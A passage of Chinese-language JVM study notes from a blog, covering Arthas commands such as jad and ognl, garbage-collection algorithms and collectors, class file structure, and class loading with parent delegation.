<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm java.math.RoundingMode &lt;init&gt;</span><br></pre></td></tr></table></figure>



<h4 id="Jad"><a href="#Jad" class="headerlink" title="Jad"></a>Jad</h4><p>可以通过 <code>jad</code> 命令来反编译代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jad com.example.demo.arthas.user.UserController</span><br></pre></td></tr></table></figure>

<p>通过<code>--source-only</code>参数可以只打印出在反编译的源代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jad --source-only com.example.demo.arthas.user.UserController</span><br></pre></td></tr></table></figure>





<h4 id="Ognl"><a href="#Ognl" class="headerlink" title="Ognl"></a>Ognl</h4><p>在Arthas里，有一个单独的<code>ognl</code>命令，可以动态执行代码。</p>
<h5 id="调用static函数"><a href="#调用static函数" class="headerlink" title="调用static函数"></a>调用static函数</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ognl &#x27;@java.lang.System@out.println(&quot;hello ognl&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>可以检查<code>Terminal 1</code>（不是arthas的Terminal 2）里的进程输出，可以发现打印出了<code>hello ognl</code>。</p>
<h5 id="查找UserController的ClassLoader"><a href="#查找UserController的ClassLoader" class="headerlink" title="查找UserController的ClassLoader"></a>查找UserController的ClassLoader</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc -d com.example.demo.arthas.user.UserController | grep classLoaderHash</span><br><span class="line">$ sc -d com.example.demo.arthas.user.UserController | grep classLoaderHash</span><br><span class="line"> classLoaderHash   1be6f5c3</span><br></pre></td></tr></table></figure>

<p>注意hashcode是变化的，需要先查看当前的ClassLoader信息，提取对应ClassLoader的hashcode。</p>
<p>如果你使用<code>-c</code>，你需要手动输入hashcode：<code>-c &lt;hashcode&gt;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ognl -c 1be6f5c3 @com.example.demo.arthas.user.UserController@logger</span><br></pre></td></tr></table></figure>

<p>对于只有唯一实例的ClassLoader可以通过<code>--classLoaderClass</code>指定class name，使用起来更加方便：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ognl --classLoaderClass org.springframework.boot.loader.LaunchedURLClassLoader  @org.springframework.boot.SpringApplication@logger</span><br><span class="line">@Slf4jLocationAwareLog[</span><br><span class="line">    FQCN=@String[org.apache.commons.logging.LogAdapter<span class="variable">$Slf4jLocationAwareLog</span>],</span><br><span class="line">    name=@String[org.springframework.boot.SpringApplication],</span><br><span class="line">    logger=@Logger[Logger[org.springframework.boot.SpringApplication]],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>--classLoaderClass</code> 的值是ClassLoader的类名，只有匹配到唯一的ClassLoader实例时才能工作，目的是方便输入通用命令，而<code>-c &lt;hashcode&gt;</code>是动态变化的。</p>
<h5 id="获取静态类的静态字段"><a href="#获取静态类的静态字段" class="headerlink" title="获取静态类的静态字段"></a>获取静态类的静态字段</h5><p>获取<code>UserController</code>类里的<code>logger</code>字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ognl --classLoaderClass org.springframework.boot.loader.LaunchedURLClassLoader @com.example.demo.arthas.user.UserController@logger</span><br></pre></td></tr></table></figure>

<p>还可以通过<code>-x</code>参数控制返回值的展开层数。比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ognl --classLoaderClass org.springframework.boot.loader.LaunchedURLClassLoader -x 2 @com.example.demo.arthas.user.UserController@logger</span><br></pre></td></tr></table></figure>

<h5 id="执行多行表达式，赋值给临时变量，返回一个List"><a href="#执行多行表达式，赋值给临时变量，返回一个List" class="headerlink" title="执行多行表达式，赋值给临时变量，返回一个List"></a>执行多行表达式，赋值给临时变量，返回一个List</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ognl &#x27;#value1=@System@getProperty(&quot;java.home&quot;), #value2=@System@getProperty(&quot;java.runtime.name&quot;), &#123;#value1, #value2&#125;&#x27;</span><br><span class="line">$ ognl &#x27;#value1=@System@getProperty(&quot;java.home&quot;), #value2=@System@getProperty(&quot;java.runtime.name&quot;), &#123;#value1, #value2&#125;&#x27;</span><br><span class="line">@ArrayList[</span><br><span class="line">    @String[/Library/Java/JavaVirtualMachines/jdk1.8.0_162.jdk/Contents/Home/jre],</span><br><span class="line">    @String[Java(TM) SE Runtime Environment],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h5 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h5><p>在Arthas里<code>ognl</code>表达式是很重要的功能，在很多命令里都可以使用<code>ognl</code>表达式。</p>
<p>一些更复杂的用法，可以参考：</p>
<ul>
<li>OGNL特殊用法请参考：<a href="https://github.com/alibaba/arthas/issues/71">https://github.com/alibaba/arthas/issues/71</a></li>
<li>OGNL表达式官方指南：<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></li>
</ul>
<h4 id="Exit-x2F-Stop"><a href="#Exit-x2F-Stop" class="headerlink" title="Exit&#x2F;Stop"></a>Exit&#x2F;Stop</h4><h5 id="退出Arthas"><a href="#退出Arthas" class="headerlink" title="退出Arthas"></a>退出Arthas</h5><p>用 <code>exit</code> 或者 <code>quit</code> 命令可以退出Arthas。</p>
<p>退出Arthas之后，还可以再次用 <code>java -jar arthas-boot.jar</code> 来连接。</p>
<h5 id="彻底退出Arthas"><a href="#彻底退出Arthas" class="headerlink" title="彻底退出Arthas"></a>彻底退出Arthas</h5><p><code>exit/quit</code>命令只是退出当前session，arthas server还在目标进程中运行。</p>
<p>想完全退出Arthas，可以执行 <code>stop</code> 命令。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172207414.png" alt="image-20220317220740046"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172208418.png" alt="image-20220317220826169"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172209619.png" alt="image-20220317220924544"></p>
<h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><p>大对象直接进入老年代;经过一次minor gc年龄加1，对象年龄到了15也会进去老年代;</p>
<h3 id="判断对象死亡"><a href="#判断对象死亡" class="headerlink" title="判断对象死亡"></a>判断对象死亡</h3><p>引用计数法:实现简单效率高;但是无法解决相互循环引用问题;（Java没有这种）</p>
<p> 这三个都没人引用，但是引用计数不为0，会导致无法被回收。</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170942333.png" alt="image-20220317094212249"></p>
<p>可达性分析算法（Java）: 这个算法的基本思想就是通过一系列的称为 <strong>“GC Roots”</strong> 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的;可以解决循环引用问题;在多线程环境下，其他线程可能会更新已经访问过的对象中的引用，从而造成误报（将引用设置为null）或者漏报（将引用设置为未被访问过的对象）。误报并没有什么伤害，Java虚拟机至多损失了部分垃圾回收的机会。漏报则比较麻烦，因为垃圾回收器可能回收事实上仍被引用的对象内存。 一旦从原引用访问已经被回收了的对象，则很有可能会直接导致Java虚拟机崩溃。</p>
<p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 finalize 方法。当对象没有覆盖 finalize 方法，或 finalize 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。</p>
<p>被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p>
<p>类似与有向图的遍历，没有被遍历到的就是垃圾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170959134.png" alt="image-20220317095911899"></p>
<h4 id="介绍一下强引用、软引用、弱引用、虚引用的区别？"><a href="#介绍一下强引用、软引用、弱引用、虚引用的区别？" class="headerlink" title="介绍一下强引用、软引用、弱引用、虚引用的区别？"></a>介绍一下强引用、软引用、弱引用、虚引用的区别？</h4><p>强引用: 必不可少的生活用品，即使报OOM也不回收; </p>
<p>软引用: 可有可无的生活用品，内存够不回收，内存不够就回收; 适合做缓存;</p>
<p>弱引用: 可有可无的生活用品，但是只要垃圾回收器发现就会回收，不管内存够不够;  Thread LocalMap的key是弱引用;</p>
<p>虚引用: 形同虚设， 任何时候都会被回收; get()也拿不到; 管理直接内存(mmap);在回收的时候起一个通知的作用，被回收的时候放到队列里去， 然后JVM再去处理这个队列，可以通知OS去处理堆外内存;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 强引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">// 软引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">SoftReference&lt;String&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;String&gt;(str);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">WeakReference&lt;String&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(str);</span><br><span class="line"><span class="comment">// 弱引用转强引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> weakReference.get();</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="type">ReferenceQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>();</span><br><span class="line"><span class="comment">// 创建虚引用，要求必须与一个引用队列关联</span></span><br><span class="line"><span class="type">PhantomReference</span> <span class="variable">pr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PhantomReference</span>(str， queue);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://juejin.cn/post/6844903665241686029">https://juejin.cn/post/6844903665241686029</a></p>
<h3 id="判断常量是否是废弃常量"><a href="#判断常量是否是废弃常量" class="headerlink" title="判断常量是否是废弃常量"></a>判断常量是否是废弃常量</h3><p>假如在字符串常量池中存在字符串 “abc”，如果当前没有任何 String 对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，”abc” 就会被系统清理出常量池了。</p>
<h3 id="判断一个类是无用的类"><a href="#判断一个类是无用的类" class="headerlink" title="判断一个类是无用的类"></a>判断一个类是无用的类</h3><p>满足三个条件才可以被回收; java堆不存在任何该类的实例; 该类的classloader已经被回收;该类的java.lang.Class对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法;</p>
<h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>标记清除算法: 标记需要不清除的对象，然后清除没有被标记的对象， 也可以标记不需要清除的对象， 然后清除未被标记的对象; 缺点:  内存碎片很多， 执行效率不稳定， 如果有大量对象需要清除， 这时就需要进行大量的标记和清除动作，导致标记和清除这两个过程的执行效率随对象数量增加而降低;</p>
<p>标记复制算法: 内存分为两块，将存活的对象复制到另一块空间，然后将原来这块空间全部清除; 缺点: 会浪费空间</p>
<p>标记整理算法: 老年代使用;将对象往一端移动，直接清理掉端边界以外的内存; 整理的过程比较耗时;</p>
<p>分代收集算法: 在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集;</p>
<h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><p>随着内存大小的不断增长而演进</p>
<p>类似家里小孩子再玩玩具，家长一遍收拾垃圾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203171025063.png" alt="image-20220317102553967"></p>
<h3 id="Serial"><a href="#Serial" class="headerlink" title="Serial"></a>Serial</h3><ul>
<li><p>内存少，几兆到几十兆；</p>
</li>
<li><p>单线程，需要暂停其他工作线程，没有线程切换的开销，效率高；</p>
</li>
<li><p>新生代：标记复制，老年代：标记整理；</p>
</li>
<li><p>适用运行在 Client 模式下的虚拟机。</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203171126832.png" alt="image-20220317112610735"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203171031583.png" alt="image-20220317103109500"></p>
<p>eden园区活着的比较少，一次minor gc 会把90%的对象清除，只有部分活着的得放到survivor 1里面去。s1和s2只有一个存了对象。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172231240.png" alt="image-20220317105459089"></p>
<h3 id="serial-old"><a href="#serial-old" class="headerlink" title="serial old"></a>serial old</h3><p>Serial的老年代版本;</p>
<h3 id="ParNew"><a href="#ParNew" class="headerlink" title="ParNew"></a>ParNew</h3><ul>
<li>新标记复制，老标记整理；</li>
<li>Serial的多线程版本，ParNew在单核甚至双核环境下绝对不会有比Serial收集器更好的效果，但是随着CPU数量的增加ParNew相较于Serial的优势会越来越明显，但并不是成倍增长的，因为有多线程切换的开销。</li>
<li>使用方式：-XX:+UseParNewGC，打开该开关后，使用ParNew(年轻代)+Serial Old(老年代)组合进行GC。另外，ParNew是CMS收集器的默认年轻代收集器。</li>
<li>ParNew用于垃圾回收的线程可用参数-XX:ParallelGCThreads&#x3D;n进行配置,建议n与主机逻辑cpu数一致。ParNew是许多运行在Server模式下的虚拟机中首选的新生代收集器，在JDK1.6以及之前的版本中，除了Serial收集器外，只有它能与CMS收集器配合工作。</li>
<li>除了多线程外，其余的行为、特点和Serial收集器一样；如Serial收集器可用控制参数、收集算法、Stop The World、内存分配规则、回收策略等；两个收集器共用了不少代码。</li>
<li>在Server模式下，ParNew收集器是一个非常重要的收集器，因为除了Serial收集器外，目前只有它能与CMS收集器配合工作；但在单个CPU环境中，不会比Serail收集器有更好的效果，因为存在线程交互开销。</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/2160494-d7320c067200d2b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/537/format/webp" alt="img"></p>
<h3 id="Parallel-Scavenge"><a href="#Parallel-Scavenge" class="headerlink" title="Parallel Scavenge"></a>Parallel Scavenge</h3><ul>
<li><p>内存几十兆到上百兆</p>
</li>
<li><p>关注cpu吞吐量，新标记复制，老标记整理，jdk 8默认;</p>
</li>
</ul>
<h3 id="Parallel-Old"><a href="#Parallel-Old" class="headerlink" title="Parallel Old"></a>Parallel Old</h3><ul>
<li>Parallel Scavenge的老年代版本</li>
</ul>
<h3 id="CMS-concurrent-mark-sweep"><a href="#CMS-concurrent-mark-sweep" class="headerlink" title="CMS(concurrent mark sweep)"></a>CMS(concurrent mark sweep)</h3><p>注重用户体验，为了获取最短停顿时间；是hotspot虚拟机第一款并发收集器，第一次实现让垃圾收集线程和用户线程基本上同时工作; 老标记清除，只收集老年代垃圾。 </p>
<ul>
<li>初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；</li>
<li>并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。（一定会出现错标）</li>
<li>重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</li>
<li>并发清除： 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。</li>
</ul>
<p>从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：并发收集、低停顿。但是它有下面三个明显的缺点：</p>
<ul>
<li>对 CPU 资源敏感；</li>
<li>无法处理浮动垃圾；</li>
<li>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203171803694.png" alt="image-20220317180322608"></p>
<h4 id="三色标记算法"><a href="#三色标记算法" class="headerlink" title="三色标记算法"></a>三色标记算法</h4><p>用在并发标记阶段，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172013702.png" alt="image-20220317201338596"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172018985.png" alt="image-20220317201800864"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172018338.png" alt="image-20220317201847260"></p>
<h3 id="G1收集器"><a href="#G1收集器" class="headerlink" title="G1收集器"></a>G1收集器</h3><p>G1 (Garbage-First) 是一款面向服务器的垃圾收集器，主要针对配备多颗处理器及大容量内存的机器。以极高概率满足 GC 停顿时间要求的同时，还具备高吞吐量性能特征。能独立管理整个 GC 堆。</p>
<p>被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备以下特点：</p>
<ul>
<li>并行与并发：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。</li>
<li>分代收集：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。</li>
<li>空间整合：与 CMS 的“标记-清理”算法不同，G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。</li>
<li>可预测的停顿：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内。</li>
</ul>
<p>G1 收集器的运作大致分为以下几个步骤：</p>
<ul>
<li>初始标记</li>
<li>并发标记</li>
<li>最终标记</li>
<li>筛选回收</li>
</ul>
<p>G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来) 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p>
<ul>
<li>G1的内存区域不是固定的E或者O</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203172027405.png" alt="image-20220317202754133"></p>
<h3 id="ZGC（zero-paused-GC）-收集器"><a href="#ZGC（zero-paused-GC）-收集器" class="headerlink" title="ZGC（zero paused GC） 收集器"></a>ZGC（zero paused GC） 收集器</h3><ul>
<li><p>支持TB级别（4T，据说已经扩展到16T）；</p>
</li>
<li><p>最大GC停顿10ms；在 ZGC 中出现 Stop The World 的情况会更少；</p>
</li>
<li><p>与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。</p>
</li>
<li><p>不再分代；</p>
</li>
</ul>
<h2 id="class类文件结构"><a href="#class类文件结构" class="headerlink" title="class类文件结构"></a>class类文件结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic; <span class="comment">//Class 文件的标志</span></span><br><span class="line">    u2             minor_version;<span class="comment">//Class 的小版本号</span></span><br><span class="line">    u2             major_version;<span class="comment">//Class 的大版本号</span></span><br><span class="line">    u2             constant_pool_count;<span class="comment">//常量池的数量</span></span><br><span class="line">    cp_info        constant_pool[constant_pool_count-<span class="number">1</span>];<span class="comment">//常量池</span></span><br><span class="line">    u2             access_flags;<span class="comment">//Class 的访问标记</span></span><br><span class="line">    u2             this_class;<span class="comment">//当前类</span></span><br><span class="line">    u2             super_class;<span class="comment">//父类</span></span><br><span class="line">    u2             interfaces_count;<span class="comment">//接口</span></span><br><span class="line">    u2             interfaces[interfaces_count];<span class="comment">//一个类可以实现多个接口</span></span><br><span class="line">    u2             fields_count;<span class="comment">//Class 文件的字段属性</span></span><br><span class="line">    field_info     fields[fields_count];<span class="comment">//一个类会可以有多个字段</span></span><br><span class="line">    u2             methods_count;<span class="comment">//Class 文件的方法数量</span></span><br><span class="line">    method_info    methods[methods_count];<span class="comment">//一个类可以有个多个方法</span></span><br><span class="line">    u2             attributes_count;<span class="comment">//此类的属性表中的属性数</span></span><br><span class="line">    attribute_info attributes[attributes_count];<span class="comment">//属性表集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p>一个类的完整生命周期中:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848914.png" alt="img"></p>
<h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p> 通过全类名获取定义此类的二进制字节流; 将字节流转换为方法区的运行时数据结构; 在内存中生成一个代表该类的Class对象，作为方法区这些数据的访问入口;</p>
<p>一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的 loadClass() 方法）。数组类型不通过类加载器创建，它由 Java 虚拟机直接创建。</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证文件是否符合JVM规范</p>
<p> 文件格式验证(类名，主次版本号); 元数据验证(对字节码描述信息进行语义分析，final); 字节码验证(最复杂的阶段，确定程序语义是合法的、符合逻辑的); 符号引用验证(确保解析动作能正确执行)</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>静态变量赋初始值</p>
<p>给static赋默认值，如果加了final关键字就是赋指定的值;</p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>将类、属性、方法等符号引用解析为直接饮用，常量池中的各种符号引用解析为指针、偏移量等内存地址的直接引用</p>
<p>讲常量池内的符号引用替换为直接引用的过程; 解析动作主要针对类或接口、字段、类方法、接口方法、方类型、方法句柄和调用限定符7类符号引用进行; </p>
<p>符号引用就是一组符号来描述目标，可以是任何字面量。<strong>直接引用</strong>就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。在程序实际运行时，只有符号引用是不够的，举个例子：在程序执行方法时，系统需要明确知道这个方法所在的位置。Java 虚拟机为每个类都准备了一张方法表来存放类中所有的方法。当需要调用一个类的方法的时候，只要知道这个方法在方法表中的偏移量就可以直接调用该方法了。通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置，从而使得方法可以被调用。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170815442.png" alt="image-20220317081538320"></p>
<p>结果为2，换个位置，结果就是3</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>执行初始化方法<clinit>()方法的过程; 这个方法是带锁线程安全的，在多线程的环境下可能会引发死锁，这种死锁是很难发现的; </p>
<p>虚拟机严格规范了下面几种情况下必须对类进行初始化</p>
<p>1.当遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</p>
<p>2.使用反射时</p>
<p>3.初始化一个类，如果其父类还没有初始化，则先出发该父类的初始化</p>
<p>4.当虚拟机启动时，用户需要定义一个执行的主类，虚拟机乎先初始化这个类</p>
<p>5.MethodHandle和VarHandle可以看作是轻量级的反射调用机制，要想使用这两个调用，就必须先使用findstaticVarHandle来初始化要调用的类</p>
<p>6.当一个接口中定义了JDK8新加入的默认方法(被default关键字修饰的接口方法)时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化</p>
<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载类即该类的Class对象被GC</p>
<p>卸载类需要满足3个条件</p>
<p>1.该类的所有实例对象都已被GC，也就是说堆不存在该类的实例对象</p>
<p>2.该类没有在其他地方别引用</p>
<p>3.该类的类加载器的实例已被GC</p>
<p>所以，在JVM生命周期类，由jvm自带的类加载器加载的类是不会被卸载的。但是由我们自定义的类加载器加载的类是可能被卸载的。</p>
<p>只要想通一点就好了，jdk自带的BootstrapClassLoader， ExtClassLoader， AppClassLoader负责加载jdk提供的类，所以它们(类加载器的实例)肯定不会被回收。而我们自定义的类加载器的实例是可以被回收的，所以使用我们自定义加载器加载的类是可以被卸载掉的。</p>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>java.lang.ClassLoader内置了三个ClassLoader</p>
<p>BootstrapClassLoader(启动类加载器): 最顶层的加载类，由C++实现，负责加载%JAVA_HOME%&#x2F;lib目录下的jar包和类或者被-Xbootclasspath参数指定路径中的所有类;</p>
<p>ExtensionClassLoader(扩展类加载器): 主要负责加载目录%JRE_HOME%&#x2F;lib&#x2F;ext目录下的jar包和类，或被java.ext.dirs系统变量所指定的路径下的jar包</p>
<p>AppClassLoader(应用程序类加载器): 面向我们用户的加载器，负责加载当前应用classpath下的所有jar包和类</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203162135643.png" alt="image-20220316213519574">  </p>
<h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><ul>
<li>每个类都有一个对应它的类加载器；</li>
<li>系统中的ClassLoader在协同工作的时候会默认使用双亲委派模型。即在类加载的时候，系统会首先判断当前类是否被加载过。 已经被加载的类会直接返回，否则才会尝试加载。 加载的时候，会把请求委派给父类加载器的loadClass() 处理， 因此所有请求最终都应该传送到顶层的启动类加载器。当父类加载器无法处理时，才由自己来处理。当父类加载器为null时，会使用启动类加载器bootstrapClassLoader作为父类加载器。</li>
</ul>
<h3 id="双亲委派模型的好处"><a href="#双亲委派模型的好处" class="headerlink" title="双亲委派模型的好处"></a>双亲委派模型的好处</h3><ul>
<li>可以保证java程序的稳定运行，可以避免类的重复加载（JVM区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类）；</li>
<li>保证了Java核心API不被篡改；如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个java.lang.Object类的话，那么程序运行的时候，系统就会出现多个不同的Object类。</li>
</ul>
<h3 id="如果不想用双亲委派模型怎么办"><a href="#如果不想用双亲委派模型怎么办" class="headerlink" title="如果不想用双亲委派模型怎么办?"></a>如果不想用双亲委派模型怎么办?</h3><p>自定义类加载器的话，需要继承ClassLoader。如果我们不想打破双亲委派模型，就重写ClassLoader类中的findClass()方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果要打破双亲委派机制模型则需要重写loadClass()方法。</p>
<p>破坏性双亲委派模型的经典案例（JDBC）<br>原生的JDBC中Driver驱动本身只是一个接口，并没有具体的实现，具体的实现是由不同数据库类型去实现的。例如，MySQL的mysql-connector-.jar中的Driver类具体实现的。 原生的JDBC中的类是放在rt.jar包的，是由启动类加载器进行类加载的，在JDBC中的Driver类中需要动态去加载不同数据库类型的Driver类，而mysql-connector-.jar中的Driver类是用户自己写的代码，那启动类加载器肯定是不能进行加载的，既然是自己编写的代码，那就需要由应用程序启动类去进行类加载。于是乎，这个时候就引入线程上下文件类加载器(Thread Context ClassLoader)。有了这个东西之后，程序就可以把原本需要由启动类加载器进行加载的类，由应用程序类加载器去进行加载了。</p>
<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>除了BootstrapClassLoader其他类加载器均由java实现，且全部继承自java.lang.ClassLoader. 如果要定义自己的类加载器，就需要继承ClassLoader.</p>
<h2 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h2><p>热点代码检测：</p>
<ul>
<li>方法计数器：监测方法执行频率</li>
<li>循环计数器：检测循环执行频率</li>
</ul>
<h2 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h2><p>JVM规范并没有规定何时加载。</p>
<p>一般的jvm实现都是懒加载。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170918315.png" alt="image-20220317091811225"></p>
<p>栈空间自动释放</p>
<p> 野指针，指向了不该指向的空间</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203170928400.png" alt="image-20220317092819316"></p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-1 Hadoop环境安装</title>
    <url>/2021/12/22/Lab-1%20Hadoop%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
